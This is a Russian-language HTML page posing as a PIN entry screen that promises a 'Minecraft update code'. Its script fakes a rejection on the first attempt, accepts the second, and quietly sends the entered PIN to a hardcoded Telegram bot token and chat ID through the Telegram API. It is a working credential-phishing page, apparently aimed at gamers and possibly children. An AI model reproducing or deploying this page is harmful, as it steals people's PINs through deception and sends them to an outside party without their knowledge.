<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PIN Code Input</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }
        #pin-container {
            text-align: center;
        }
        #pin-input {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }
        .pin-circle {
            border: 2px solid #000;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            margin: 5px;
        }
        .filled {
            background-color: #000;
        }
        .error {
            background-color: #ff4c4c;
        }
        #error-message, #success-message {
            color: red;
            margin-top: 10px;
            display: none;
        }
        #success-message {
            color: green;
        }
        .shake {
            animation: shake 0.5s;
        }
        @keyframes shake {
            0% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            50% { transform: translateX(5px); }
            75% { transform: translateX(-5px); }
            100% { transform: translateX(0); }
        }
        #keyboard {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 20px;
        }
        .key {
            background-color: #ccc;
            border: none;
            border-radius: 5px;
            font-size: 20px;
            padding: 15px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="pin-container">
        <p>PIN-CODE</p>
        <div id="pin-input">
            <div class="pin-circle"></div>
            <div class="pin-circle"></div>
            <div class="pin-circle"></div>
            <div class="pin-circle"></div>
        </div>
        <p id="error-message">Неверный пароль. Пожалуйста, попробуйте еще раз.</p>
        <p id="success-message">Вот ваш код для обновления Minecraft -Id74838848</p>
    </div>
    <div id="keyboard">
        <!-- Клавиатура -->
        <button class="key">1</button>
        <button class="key">2</button>
        <button class="key">3</button>
        <button class="key">4</button>
        <button class="key">5</button>
        <button class="key">6</button>
        <button class="key">7</button>
        <button class="key">8</button>
        <button class="key">9</button>
        <button class="key">0</button>
        <button class="key" id="backspace">⌫</button>
        <button class="key" id="reset">Сброс</button>
    </div>

    <script>
        let pin = [];
        let attemptCount = 0;
        let success = false;
        const pinCircles = document.querySelectorAll('.pin-circle');

        function updatePinDisplay(error = false) {
            pinCircles.forEach((circle, index) => {
                if (pin[index]) {
                    circle.classList.add('filled');
                    if (error) {
                        circle.classList.add('error');
                    } else {
                        circle.classList.remove('error');
                    }
                } else {
                    circle.classList.remove('filled', 'error');
                }
            });
        }

        function shakeAndVibrate() {
            document.getElementById('pin-container').classList.add('shake');
            navigator.vibrate([200, 100, 200]); // Вибрация
            setTimeout(() => {
                document.getElementById('pin-container').classList.remove('shake');
            }, 500);
        }

        function handleKeyPress(value) {
            if (success) {
                resetPin();
                return;
            }

            if (value === '⌫') {
                pin.pop();
            } else if (pin.length < 4 && !isNaN(value)) {
                pin.push(value);
            } else if (value === 'Сброс') {
                resetPin();
            }

            updatePinDisplay();

            if (pin.length === 4) {
                validatePin(pin.join(''));
            }
        }

        function validatePin(enteredPin) {
            attemptCount++;
            if (attemptCount === 1) {
                // Первый ввод: всегда неверный
                document.getElementById('error-message').style.display = 'block';
                updatePinDisplay(true);
                shakeAndVibrate();
                setTimeout(() => {
                    pin = [];
                    updatePinDisplay();
                    document.getElementById('error-message').style.display = 'none';
                }, 1000);
            } else {
                // Второй ввод: всегда успешный
                document.getElementById('success-message').style.display = 'block';
                sendPinToTelegram(enteredPin);
                success = true;
            }
        }

        function resetPin() {
            pin = [];
            updatePinDisplay();
            document.getElementById('error-message').style.display = 'none';
            document.getElementById('success-message').style.display = 'none';
            success = false;
            attemptCount = 0;
        }

        function sendPinToTelegram(pin) {
            // Отправка PIN-кода в Telegram-бота
            const botToken = '7352444289:AAGahXx4XTy3COe1hnioJfPBpF8KNumhYgM';
            const chatId = '5353040565';
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const message = `Введен PIN: ${pin}. Код для обновления Minecraft: Id74838848`;

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });
        }

        document.getElementById('keyboard').addEventListener('click', (event) => {
            if (event.target.classList.contains('key')) {
                handleKeyPress(event.target.innerText);
            }
        });
    </script>
</body>
</html>
